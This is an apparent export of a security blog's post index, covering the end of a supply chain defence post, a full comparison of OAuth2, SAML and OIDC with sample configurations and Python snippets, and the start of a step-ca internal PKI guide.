maintenance 2. Update Testing Never auto-update dependencies to production:\nUpdate in staging environment first Run full test suite Monitor for unusual behavior Gradual rollout to production (canary deployment) 3. Incident Response Plan When supply chain attack is suspected:\nIsolate affected systems Rotate all credentials Review all builds from time period Audit logs for unusual activity Rebuild from trusted source if needed Communicate transparently with users Real-World Defense Stories Case 1: \u0026ldquo;Frozen installs\u0026rdquo; prevented a bad day Team had a habit of running npm install directly on build agents.\nThey changed to:\nnpm ci (lockfile required, clean install) --ignore-scripts on CI for builds that shouldn\u0026rsquo;t run arbitrary install hooks Result: a typo in a PR couldn\u0026rsquo;t silently pull in a new package and run an install script. The build failed loudly instead of doing something \u0026ldquo;helpful\u0026rdquo;.\nCase 2: Pinning GitHub Actions to commits stopped supply chain drift This is boring, and it works.\nInstead of:\n- uses: some-org/some-action@v3 They pinned to a commit SHA:\n- uses: some-org/some-action@3a2f9c1d8a6b9b9d0d3c9b1b6b9c1d8a6b9b9d0d Result: a compromised tag couldn\u0026rsquo;t silently change what ran in CI.\nCase 3: Base images became a product, not a random download Team stopped pulling random base images in production builds.\nThey:\nBuilt a small set of internal base images (one for each runtime) Scanned them (Trivy/Grype) Signed them (Cosign) Forced all app builds to use only those images Result: when a new CVE landed, they rebuilt a handful of base images and the fleet inherited the fix on the next deploy.\nResult: Zero container supply chain incidents in 2 years.\nTrade-off: More maintenance, but complete control.\nCommon Mistakes Mistake 1: Trusting Package Stars or Downloads Popular doesn\u0026rsquo;t mean secure. Malicious packages can:\nPurchase stars (GitHub services exist for this) Use bot networks to download Look legitimate but contain backdoors Better: Review maintainer, code quality, security posture.\nMistake 2: Ignoring Dev Dependencies Security scanners often miss dev dependencies (test frameworks, linting tools, etc.). These can be compromised too.\nExample: eslint dev dependency could steal your source code.\nBetter: Scan all dependencies, not just production ones.\nMistake 3: No Visibility Into Dependency Tree You depend on package A. Package A depends on B. Package B depends on C. C is compromised.\nYou\u0026rsquo;re vulnerable even though you never installed C.\nBetter: Use tools that scan entire dependency tree (Snyk, Dependabot, npm audit).\nMistake 4: Assuming Open Source Means Safe Anyone can publish to npm, PyPI, etc. There\u0026rsquo;s no security review before publication.\nOpen source allows code review, but doesn\u0026rsquo;t guarantee it happened.\nBetter: Treat all packages with skepticism. Verify before trust.\nMonitoring and Detection What to Monitor Dependency vulnerabilities:\nDependabot alerts (GitHub) Snyk, WhiteSource, similar tools OS package managers (apt, yum) security updates Unusual behavior:\nUnexpected CPU usage (cryptocurrency mining) Network traffic to unknown endpoints (data exfiltration) New files or processes in containers Maintainer activity:\nMaintainer publishes suspicious package Maintainer account compromised (social engineering, credential theft) Repository ownership changes Detection Tools npm:\nnpm audit # Check for known vulnerabilities npm audit fix # Fix automatically npm outdated # Check for updates Python:\npip-audit # Audit dependencies pip list --outdated # See what you\u0026#39;re falling behind on Go:\ngo list -json -m all | nancy sleuth # Vulnerability scanner govulncheck # Check for vulnerabilities Docker:\ntrivy image your-image:tag # Scan image grype your-image:tag # Scan image The Honest Reality Prevention isn\u0026rsquo;t enough. You will miss things. Supply chain is too large, too complex, too adversarial.\nYou need:\nDetection - Monitor dependencies, unusual behavior, alerts Resilience - Assume compromise, plan for it Rapid response - When attack happens, react fast Canary tokens help. They detect when attackers use compromised dependencies. See previous post for details.\nZero trust helps. Don\u0026rsquo;t blindly trust packages, images, maintainers. Verify everything.\nProcess matters more than tools. The best security tools don\u0026rsquo;t help if you:\nIgnore alerts Don\u0026rsquo;t review new dependencies Auto-update to production Have no incident response plan Supply chain attacks aren\u0026rsquo;t going away. They\u0026rsquo;re too profitable, too effective. Your job isn\u0026rsquo;t to eliminate risk (impossible). It\u0026rsquo;s to reduce it, detect it quickly, and respond effectively when it happens.\nBecause the attackers will find a way in. The question is: will you notice in time?\nRelated Stories:\nCanary Tokens: Early Warning Systems That Actually Work - Detection when prevention fails Security Tools That Actually Work vs What Vendors Sell You - Practical security over marketing Lessons from SolarWinds, Log4j, npm typosquatting incidents, and defending supply chains at startups, banks, and everything between.\n","date":"10 Nov 2025","permalink":"https://gazsecops.github.io/posts/supply-chain-attacks-how-they-happen/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Our own code is secure. Dependencies from npm, GitHub, Docker Hub. That\u0026rsquo;s safe, right?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e That\u0026rsquo;s where most attacks actually happen.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e But those maintainers are legit companies!\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e So were SolarWinds and Log4j maintainers. What\u0026rsquo;s your point?\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The attack surface isn't what you wrote. It's everything you trusted. And you trusted a lot.\"\n\u003c/aside\u003e\n\u003cp\u003eWe obsess over secure coding practices. Input validation, authentication, access controls. But then we pull in 2000 dependencies from npm, PyPI, Docker Hub. We download images, run unverified binaries, trust package maintainers we\u0026rsquo;ve never met.\u003c/p\u003e\n\u003cp\u003eThat\u0026rsquo;s where supply chain attacks live. Not in your code. In everyone else\u0026rsquo;s.\u003c/p\u003e","tags":["security","supply-chain","dependencies","vulnerabilities"],"title":"Supply Chain Attacks: How They Happen and What Actually Works to Stop Them"},{"content":" Management: We need single sign-on for our new internal app.\nSysadmin: What kind? OAuth2 or SAML?\nManagement: Does it matter? They both do login.\nSysadmin: One\u0026rsquo;s for APIs and mobile apps. The other\u0026rsquo;s for enterprise SSO. Yeah, it matters.\n\"SAML is what enterprises use because they've used it for 20 years and it works. OAuth2 is what startups use because it's simple and modern. Neither is wrong, just different.\" I\u0026rsquo;ve had this conversation too many times. Someone builds a new internal application, needs authentication, gets confused between OAuth2 and SAML. They\u0026rsquo;re both \u0026ldquo;login with company account\u0026rdquo; from user\u0026rsquo;s perspective. Underneath? Completely different protocols for different problems.\nThe Fundamental Difference OAuth2 is an authorization framework. It\u0026rsquo;s about delegation - giving an application permission to act on your behalf.\nSAML is an authentication protocol. It\u0026rsquo;s about identity - proving who you are and getting a trusted assertion.\nThe confusion comes because OAuth2 gets used for authentication (OpenID Connect). But at their core:\nOAuth2 SAML Authorization (can I access this API?) Authentication (who am I?) JSON-based XML-based Tokens (access tokens, refresh tokens) Assertions (XML assertions) Modern, API-focused Enterprise, XML-heavy Simple to implement Complex but feature-rich How OAuth2 Works The Flow OAuth2 defines several flows (grant types). Most common:\nAuthorization Code Flow (for server-side apps):\nRedirect to identity provider - Application redirects user\u0026rsquo;s browser to IdP (Google, GitHub, etc.) User authenticates - User logs in with their credentials Authorization code - IdP redirects back to your app with a temporary code Exchange code for token - Your backend exchanges the code for an access token (and refresh token) Access API - Use access token to make requests on user\u0026rsquo;s behalf Implicit Flow (for single-page apps - now deprecated in favour of PKCE):\nRedirect to identity provider - Application redirects user to IdP User authenticates - User logs in Access token in URL - IdP redirects back with access token directly in URL fragment Access API - Use token to make requests Authorization Code Flow with PKCE (for mobile and SPAs):\nSame as authorization code flow, but with a code verifier to prevent interception attacks. This is what you should use for mobile and SPAs now.\nThe Token Structure { \u0026#34;access_token\u0026#34;: \u0026#34;eyJhbGciOiJIUzI1NiIs...\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;refresh_token\u0026#34;: \u0026#34;def502ad1f8c...\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;read:user user:email\u0026#34; } Access token: Short-lived token used to access APIs Refresh token: Long-lived token used to get new access tokens Scope: Permissions granted to the token\nCode Example from authlib.integrations.requests_client import OAuth2Session # OAuth2 session client_id = \u0026#34;your_app_id\u0026#34; client_secret = \u0026#34;your_app_secret\u0026#34; authorization_endpoint = \u0026#34;https://github.com/login/oauth/authorize\u0026#34; token_endpoint = \u0026#34;https://github.com/login/oauth/access_token\u0026#34; # Step 1: Redirect user to authorization endpoint auth_url = f\u0026#34;{authorization_endpoint}?client_id={client_id}\u0026amp;scope=user:email\u0026#34; # In real app, redirect user\u0026#39;s browser to this URL # Step 2: User authenticates at GitHub, redirected back with code # Step 3: Exchange code for token session = OAuth2Session(client_id, client_secret) token = session.fetch_token(token_endpoint, authorization_response=request.url) # Step 4: Use access token response = session.get(\u0026#34;https://api.github.com/user\u0026#34;) user_data = response.json() # Step 5: Refresh access token if expired new_token = session.refresh_token(token_endpoint, refresh_token=token[\u0026#39;refresh_token\u0026#39;]) When OAuth2 Makes Sense Good for:\nMobile applications (native apps) Single-page applications (JavaScript in browser) Third-party API integrations (\u0026ldquo;Connect with Google\u0026rdquo;) Server-side applications needing delegated access Modern web applications Not good for:\nEnterprise SSO with complex requirements (SAML\u0026rsquo;s better here) Situations requiring rich security assertions (SAML has more features) Legacy enterprise systems that already use SAML How SAML Works The Flow SAML uses XML assertions and a browser-based SSO flow:\nRequest access - Application (Service Provider) requests authentication from IdP Redirect to IdP - User\u0026rsquo;s browser redirected to Identity Provider (Azure AD, Okta, etc.) User authenticates - User logs in (possibly via another SSO) SAML assertion - IdP creates XML assertion with user\u0026rsquo;s identity and attributes Redirect back - Assertion POSTed back to application via browser Validate assertion - Application validates signature, extracts user identity Create session - Application creates local session for user The SAML Assertion \u0026lt;samlp:Response xmlns:samlp=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34; ID=\u0026#34;_8e8dc5f69a98cc4c1ff98297e343f1fc3079276f\u0026#34; Version=\u0026#34;2.0\u0026#34; IssueInstant=\u0026#34;2025-11-10T10:00:00Z\u0026#34;\u0026gt; \u0026lt;saml:Issuer xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt; https://idp.example.com/saml \u0026lt;/saml:Issuer\u0026gt; \u0026lt;ds:Signature xmlns:ds=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; \u0026lt;!-- Cryptographic signature proving this assertion is from trusted IdP --\u0026gt; \u0026lt;/ds:Signature\u0026gt; \u0026lt;samlp:Status\u0026gt; \u0026lt;samlp:StatusCode Value=\u0026#34;urn:oasis:names:tc:SAML:2.0:status:Success\u0026#34;/\u0026gt; \u0026lt;/samlp:Status\u0026gt; \u0026lt;saml:Assertion xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; ID=\u0026#34;_b7b6da6926e49e8c1ff9213e345f2ge3079867g\u0026#34; IssueInstant=\u0026#34;2025-11-10T10:00:00Z\u0026#34; Version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;saml:Issuer\u0026gt;https://idp.example.com/saml\u0026lt;/saml:Issuer\u0026gt; \u0026lt;ds:Signature\u0026gt;...\u0026lt;/ds:Signature\u0026gt; \u0026lt;saml:Subject\u0026gt; \u0026lt;saml:NameID Format=\u0026#34;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\u0026#34;\u0026gt; user@example.com \u0026lt;/saml:NameID\u0026gt; \u0026lt;saml:SubjectConfirmation Method=\u0026#34;urn:oasis:names:tc:SAML:2.0:cm:bearer\u0026#34;\u0026gt; \u0026lt;saml:SubjectConfirmationData NotOnOrAfter=\u0026#34;2025-11-10T10:05:00Z\u0026#34; Recipient=\u0026#34;https://app.example.com/saml/acs\u0026#34;/\u0026gt; \u0026lt;/saml:SubjectConfirmation\u0026gt; \u0026lt;/saml:Subject\u0026gt; \u0026lt;saml:AttributeStatement\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;email\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue\u0026gt;user@example.com\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;firstName\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue\u0026gt;John\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;lastName\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue\u0026gt;Doe\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;groups\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue\u0026gt;Engineering\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;saml:AttributeValue\u0026gt;Admin\u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;/saml:AttributeStatement\u0026gt; \u0026lt;saml:AuthnStatement AuthnInstant=\u0026#34;2025-11-10T10:00:00Z\u0026#34; SessionIndex=\u0026#34;_8e8dc5f69a98cc4c1ff98297e343f1fc3079276f\u0026#34; SessionNotOnOrAfter=\u0026#34;2025-11-10T11:00:00Z\u0026#34;\u0026gt; \u0026lt;saml:AuthnContext\u0026gt; \u0026lt;saml:AuthnContextClassRef\u0026gt; urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport \u0026lt;/saml:AuthnContextClassRef\u0026gt; \u0026lt;/saml:AuthnContext\u0026gt; \u0026lt;/saml:AuthnStatement\u0026gt; \u0026lt;/saml:Assertion\u0026gt; \u0026lt;/samlp:Response\u0026gt; This XML assertion contains:\nUser\u0026rsquo;s identity (NameID, email, name) User attributes (groups, department, etc.) Authentication details (when they logged in, how) Digital signature (proves it\u0026rsquo;s from trusted IdP) Code Example from saml2 import BINDING_HTTP_POST from saml2.client import Saml2Client from saml2.config import Config as Saml2Config # SAML configuration saml_config = { \u0026#39;entityid\u0026#39;: \u0026#39;https://app.example.com/saml\u0026#39;, \u0026#39;metadata\u0026#39;: { \u0026#39;remote\u0026#39;: [{ \u0026#39;entityid\u0026#39;: \u0026#39;https://idp.example.com/saml\u0026#39;, \u0026#39;metadata\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://idp.example.com/saml/metadata.xml\u0026#39; } }] }, \u0026#39;service\u0026#39;: { \u0026#39;sp\u0026#39;: { \u0026#39;endpoints\u0026#39;: { \u0026#39;assertion_consumer_service\u0026#39;: [ (\u0026#39;https://app.example.com/saml/acs\u0026#39;, BINDING_HTTP_POST), ], }, \u0026#39;allow_unsolicited\u0026#39;: True, \u0026#39;authn_requests_signed\u0026#39;: False, \u0026#39;logout_requests_signed\u0026#39;: True, \u0026#39;want_assertions_signed\u0026#39;: True, \u0026#39;want_assertions_encrypted\u0026#39;: False, \u0026#39;want_name_id_encrypted\u0026#39;: False, } } } # Create SAML client config = Saml2Config() config.load(saml_config) saml_client = Saml2Client(config) # Step 1: Create SAML auth request req_id, authn_request = saml_client.create_authn_request( entity_id=\u0026#39;https://idp.example.com/saml\u0026#39;, sign=False ) # Step 2: Redirect user to IdP auth_url = saml_client.apply_binding( BINDING_HTTP_POST, authn_request, \u0026#39;https://idp.example.com/saml/sso\u0026#39; ) # In real app, redirect user\u0026#39;s browser to this URL # Step 3: User authenticates, IdP POSTs SAML assertion back # Step 4: Parse and validate assertion authn_response = saml_client.parse_authn_request_response( saml_request_xml_from_post_body, BINDING_HTTP_POST ) # Step 5: Validate assertion if not authn_response.get_identity(): raise Exception(\u0026#34;Invalid SAML response\u0026#34;) # Step 6: Extract user data user_data = authn_response.get_identity() email = user_data[\u0026#39;email\u0026#39;] name = user_data[\u0026#39;firstName\u0026#39;] groups = user_data[\u0026#39;groups\u0026#39;] # Step 7: Create local session create_session(email, name, groups) When SAML Makes Sense Good for:\nEnterprise single sign-on (SSO) Applications needing rich user attributes (groups, department, roles) Compliance-heavy environments (government, finance, healthcare) Integration with existing enterprise identity providers (Azure AD, Okta, Ping) Situations requiring strong security assertions (encrypted assertions, signed responses) Not good for:\nMobile applications (browser-based SSO doesn\u0026rsquo;t work well) Third-party API integrations (OAuth2 is designed for this) Simple use cases (OAuth2 is easier) Modern startups without existing SAML infrastructure The OpenID Connect Twist Here\u0026rsquo;s where it gets confusing. OpenID Connect (OIDC) is built on top of OAuth2 but adds authentication.\nOAuth2: Authorization (can I access this API?) OIDC: Authentication (who am I?)\nOIDC adds to OAuth2:\nStandardized ID token (JWT with user identity) Standardized userinfo endpoint Discovery endpoint (find endpoints automatically) Registration endpoint (dynamic client registration) OIDC ID Token { \u0026#34;iss\u0026#34;: \u0026#34;https://idp.example.com\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;1234567890\u0026#34;, \u0026#34;aud\u0026#34;: \u0026#34;your_client_id\u0026#34;, \u0026#34;exp\u0026#34;: 1699999999, \u0026#34;iat\u0026#34;: 1699909999, \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;user@example.com\u0026#34;, \u0026#34;groups\u0026#34;: [\u0026#34;Engineering\u0026#34;, \u0026#34;Admin\u0026#34;] } This is a JWT (JSON Web Token) - signed, verifiable, contains user identity.\nWhen to Use OIDC Use OIDC when:\nYou want OAuth2 simplicity but need authentication You\u0026rsquo;re building modern web applications You need standardized user identity format You want to avoid XML complexity of SAML Many modern IdPs (Azure AD, Auth0, Okta) support both SAML and OIDC.\nThe Hybrid Setup You See Everywhere Most organisations don\u0026rsquo;t pick one protocol and live happily ever after. They end up with a hybrid.\nTypical enterprise pattern:\nBrowser SSO into the web app using SAML (because the enterprise IdP and group/attribute mapping is already there) Web app creates a session (cookie) Web app calls internal APIs using OAuth2 access tokens (service-to-service, or on behalf of the user) Why this happens:\nSAML is good at browser SSO and shoving attributes/groups into an assertion OAuth2 is good at API calls and scoped tokens What breaks if you get this wrong:\nYou treat a SAML login as permission to call every API forever You mint an internal \u0026ldquo;god token\u0026rdquo; because it\u0026rsquo;s easier than scoping You never re-check group membership, so leavers keep access via long-lived sessions If you do hybrid, be explicit about the boundary:\nSAML/OIDC gets the user into the app OAuth2 tokens control what the app can do to downstream services Decision Framework Choose OAuth2 (or OIDC) When: Your application is:\nMobile app (iOS, Android) Single-page application (React, Angular, Vue) API-focused (REST, GraphQL) Third-party integration (\u0026ldquo;Connect with X\u0026rdquo;) Modern web application without enterprise SSO requirements You need:\nSimple implementation Token-based API access Delegated permissions (app acts on user\u0026rsquo;s behalf) Modern development experience JSON-based data exchange Examples:\nMobile app accessing social media API SPAs needing user login with Google B2B application integrating with partner\u0026rsquo;s APIs Internal tool using GitHub or GitLab for login Choose SAML When: Your application is:\nEnterprise web application Internal business application Application requiring compliance (SOC2, HIPAA, PCI-DSS) Part of existing enterprise SSO ecosystem You need:\nRich user attributes (groups, department, org hierarchy) Enterprise SSO integration (Azure AD, Okta, Ping) Strong security assertions (signed, encrypted responses) Federation standards Integration with legacy enterprise systems Examples:\nHR management system Finance application requiring department-level access Internal dashboard for employees Application deployed to enterprise environment with existing IdP Practical Decision Flow Start │ ├─ Does this need to integrate with enterprise SSO (Azure AD, Okta)? │ ├─ Yes → Use SAML (or OIDC if IdP supports it) │ └─ No → Continue │ ├─ Is this a mobile app or SPA? │ ├─ Yes → Use OAuth2 (or OIDC) │ └─ No → Continue │ ├─ Is this for third-party API access? │ ├─ Yes → Use OAuth2 │ └─ No → Continue │ ├─ Do you need rich user attributes (groups, department)? │ ├─ Yes → Use SAML │ └─ No → Use OAuth2/OIDC │ └─ Are you a modern startup without legacy constraints? ├─ Yes → Use OAuth2/OIDC (simpler, more modern) └─ No → Use SAML (fits enterprise ecosystem) Common Mistakes Mistake 1: Using OAuth2 for Enterprise SSO OAuth2 can do authentication (via OIDC), but enterprise features are limited.\nProblems:\nOIDC doesn\u0026rsquo;t have SAML\u0026rsquo;s rich attribute capabilities Enterprise IdPs sometimes don\u0026rsquo;t support OIDC fully Missing enterprise-specific features (fine-grained access control, complex attribute mapping) Better: Use SAML for enterprise SSO. Use OAuth2 for APIs and third-party integrations.\nMistake 2: Using SAML for Mobile Apps SAML is browser-based. Doesn\u0026rsquo;t work well for mobile apps.\nProblems:\nRequires embedded browser (bad UX) Complex XML parsing on mobile devices Not designed for mobile-first flows Better: Use OAuth2 with PKCE for mobile apps.\nMistake 3: Confusing OAuth2 with Authentication OAuth2 is authorization. Using it for authentication directly is reinventing the wheel.\nProblems:\nNo standardized user identity format Every provider does it differently Security vulnerabilities if done incorrectly Better: Use OpenID Connect (OIDC) - it\u0026rsquo;s OAuth2 done right for authentication.\nMistake 4: Implementing SAML from Scratch SAML is complex. Implementing it from scratch is painful.\nProblems:\nXML parsing and signing is error-prone Security vulnerabilities in custom implementations Time-consuming to get right Better: Use a library (saml2 in Python, node-saml in Node.js, etc.) or a service like Auth0 or Okta.\nIntegration Examples Example 1: Internal Enterprise Web App Scenario: HR management system deployed to enterprise environment using Azure AD.\nSolution: Use SAML.\n# Configure SAML with Azure AD metadata saml_config = { \u0026#39;entityid\u0026#39;: \u0026#39;https://hr-app.company.com/saml\u0026#39;, \u0026#39;metadata\u0026#39;: { \u0026#39;remote\u0026#39;: [{ \u0026#39;entityid\u0026#39;: \u0026#39;https://sts.windows.net/company-id/\u0026#39;, \u0026#39;metadata\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://sts.windows.net/company-id/federationmetadata/2007-06/federationmetadata.xml\u0026#39; } }] }, # ... rest of config } # User redirected to Azure AD login # SAML assertion returned with user\u0026#39;s groups, department, manager # Create local session with appropriate permissions Example 2: Mobile App with Social Login Scenario: Fitness app allowing login with Google, Facebook, Apple.\nSolution: Use OAuth2 (Authorization Code Flow with PKCE).\n# OAuth2 configuration for each provider providers = { \u0026#39;google\u0026#39;: { \u0026#39;authorization_endpoint\u0026#39;: \u0026#39;https://accounts.google.com/o/oauth2/v2/auth\u0026#39;, \u0026#39;token_endpoint\u0026#39;: \u0026#39;https://oauth2.googleapis.com/token\u0026#39;, \u0026#39;scope\u0026#39;: \u0026#39;email profile\u0026#39; }, \u0026#39;facebook\u0026#39;: { \u0026#39;authorization_endpoint\u0026#39;: \u0026#39;https://www.facebook.com/v18.0/dialog/oauth\u0026#39;, \u0026#39;token_endpoint\u0026#39;: \u0026#39;https://graph.facebook.com/v18.0/oauth/access_token\u0026#39;, \u0026#39;scope\u0026#39;: \u0026#39;email\u0026#39; } } # User selects provider, redirected to login # Exchange code for token (with PKCE verifier) # Use access token to fetch user profile Example 3: Third-Party API Integration Scenario: E-commerce platform needs to access customer\u0026rsquo;s Shopify store data.\nSolution: Use OAuth2 (Authorization Code Flow).\n# OAuth2 with Shopify client_id = \u0026#34;your_app_id\u0026#34; client_secret = \u0026#34;your_app_secret\u0026#34; # Redirect user to Shopify install URL install_url = f\u0026#34;https://{shop_domain}/admin/oauth/authorize?client_id={client_id}\u0026amp;scope=read_products,read_orders\u0026#34; # User approves, returns code # Exchange code for access token token = exchange_code_for_token(install_url, client_secret) # Use access token to call Shopify API products = get_products_from_shopify(token[\u0026#39;access_token\u0026#39;]) Example 4: Modern Internal Web App with OIDC Scenario: Internal dashboard for tech startup using Auth0.\nSolution: Use OpenID Connect (OIDC).\nfrom authlib.integrations.requests_client import OAuth2Session # OIDC configuration issuer = \u0026#34;https://company.auth0.com\u0026#34; config_url = f\u0026#34;{issuer}/.well-known/openid-configuration\u0026#34; # Fetch OIDC configuration dynamically session = OAuth2Session(client_id, client_secret) config = session.get(config_url).json() # Build authorization URL from OIDC config auth_url = ( f\u0026#34;{config[\u0026#39;authorization_endpoint\u0026#39;]}\u0026#34; f\u0026#34;?client_id={client_id}\u0026#34; f\u0026#34;\u0026amp;response_type=code\u0026#34; f\u0026#34;\u0026amp;scope=openid profile email\u0026#34; f\u0026#34;\u0026amp;redirect_uri={redirect_uri}\u0026#34; ) # User authenticates, returns code # Exchange for tokens tokens = session.fetch_token( config[\u0026#39;token_endpoint\u0026#39;], authorization_response=request.url, client_secret=client_secret ) # ID token contains user identity (JWT) id_token = tokens[\u0026#39;id_token\u0026#39;] user_info = decode_jwt(id_token) Security Considerations OAuth2 Security Common vulnerabilities:\nImplicit flow without PKCE: Access tokens exposed in URL fragment CSRF attacks: No state parameter to verify request Token leakage: Tokens stored insecurely or exposed in logs Insufficient scope validation: App requests more permissions than needed Best practices:\nUse Authorization Code Flow with PKCE for mobile/SPAs Always use HTTPS (never HTTP) Implement state parameter to prevent CSRF Validate scopes on every token Store tokens securely (httpOnly cookies, secure storage on mobile) Implement token revocation Use short-lived access tokens with refresh tokens If you\u0026rsquo;re using OIDC for login, add this to your checklist:\nValidate the ID token signature via JWKS Check iss, aud, and exp Use a nonce and verify it (stops replay) If you don\u0026rsquo;t validate ID tokens properly, you\u0026rsquo;ve built \u0026ldquo;log in with random JWT\u0026rdquo;.\nSAML Security Common vulnerabilities:\nXML Signature bypass: Insecure XML signature validation XML External Entity (XXE): XML processing vulnerabilities Replay attacks: Reusing captured assertions Man-in-the-middle: Unencrypted assertions over HTTP Best practices:\nAlways validate XML signatures Use secure XML parsers (disable XXE) Implement assertion expiration and validity checks Use HTTPS only Validate assertion recipient matches your service URL Validate assertion issuer matches your IdP Implement proper logout (single logout) Two practical rules that save you from the classic SAML failures:\nValidate the signature on what you actually consume. If your library parses one assertion but verifies a different signature, you\u0026rsquo;re in trouble. Validate AudienceRestriction and Recipient. If the assertion isn\u0026rsquo;t for your SP entity ID and your ACS endpoint, reject it. The Honest Advice If you\u0026rsquo;re a startup or modern web app:\nUse OAuth2 with OpenID Connect Implement Authorization Code Flow with PKCE for mobile/SPAs It\u0026rsquo;s simpler, well-documented, widely supported Don\u0026rsquo;t touch SAML unless you absolutely have to If you\u0026rsquo;re enterprise:\nUse SAML for enterprise SSO It integrates with your existing Azure AD, Okta, Ping Rich attribute support and compliance features out of box Don\u0026rsquo;t try to use OAuth2 for complex enterprise requirements If you\u0026rsquo;re doing third-party integrations:\nUse OAuth2 (that\u0026rsquo;s what it\u0026rsquo;s designed for) Implement proper token storage and refresh Validate scopes and permissions carefully Document integration for other developers If you\u0026rsquo;re confused:\nStart with OAuth2/OIDC (it\u0026rsquo;s simpler) Switch to SAML only when enterprise requirements force you Don\u0026rsquo;t implement authentication from scratch - use a library or service Lessons from implementing both in environments ranging from startups with Auth0 to enterprises with Azure AD and custom SAML. Both work. They solve different problems. Pick the right one for your situation.\n","date":"10 Nov 2025","permalink":"https://gazsecops.github.io/posts/oauth2-vs-saml-differences/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need single sign-on for our new internal app.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What kind? OAuth2 or SAML?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Does it matter? They both do login.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e One\u0026rsquo;s for APIs and mobile apps. The other\u0026rsquo;s for enterprise SSO. Yeah, it matters.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"SAML is what enterprises use because they've used it for 20 years and it works. OAuth2 is what startups use because it's simple and modern. Neither is wrong, just different.\"\n\u003c/aside\u003e\n\u003cp\u003eI\u0026rsquo;ve had this conversation too many times. Someone builds a new internal application, needs authentication, gets confused between OAuth2 and SAML. They\u0026rsquo;re both \u0026ldquo;login with company account\u0026rdquo; from user\u0026rsquo;s perspective. Underneath? Completely different protocols for different problems.\u003c/p\u003e","tags":["authentication","oauth2","saml","security","enterprise"],"title":"OAuth2 vs SAML: Which One and Why?"},{"content":"If you read my post on building your own CA and thought \u0026ldquo;fine, but how do I actually issue certs without becoming the Certificate Person\u0026rdquo;, this is the next step.\nstep-ca (Smallstep Certificate Authority) is the bit that makes internal PKI usable: automated issuance, short-lived certs, predictable renewal, and enough policy to stop someone minting a wildcard for your entire estate.\nIt also gives you a new thing to break at 3am.\nOn-call: Everything that talks TLS is failing.\nEngineer: But we rotated the certs yesterday.\nSysadmin: You rotated them to a CA chain nobody trusts. Also the CA is down.\nManagement: How can the CA being down break existing connections?\nSysadmin: It doesn\u0026rsquo;t. The expiry storm you scheduled does.\nInternal PKI fails in three ways: you lose the keys, you lose the trust, or you lose control of issuance. This post covers a practical step-ca setup on a Linux VM, what to lock down, how to issue and renew certs, and the failure modes I\u0026rsquo;ve seen in the wild.\nWhat step-ca Actually Buys You You can run an internal CA with OpenSSL and a folder of files. People do. It works right up until you have:\n400 services needing certs 6 different teams doing it \u0026ldquo;their way\u0026rdquo; one critical service with a cert that expires on Christmas Day step-ca buys you boring consistency:\none place to issue certs one policy layer (who can get what, with what SANs) automation via ACME and step CLI short lifetimes so stolen certs are less useful If you haven\u0026rsquo;t read the CA post, start there for the threat model and the \u0026ldquo;don\u0026rsquo;t leak the root key\u0026rdquo; rules.\nBuilding Your Own CA: Guardrails, Browser Trust, and Why Most Internal PKI is Broken Architecture: Keep the Root Offline The safe default:\nRoot CA key: offline, rarely used Intermediate CA key: online, used for issuing step-ca: runs with the intermediate key That way:\ncompromise of the step-ca box does not give an attacker the root key you can rotate the intermediate without redeploying trust roots everywhere If you put the root key on the same VM as your issuing CA, you\u0026rsquo;re not running PKI. You\u0026rsquo;re running \u0026ldquo;one box to 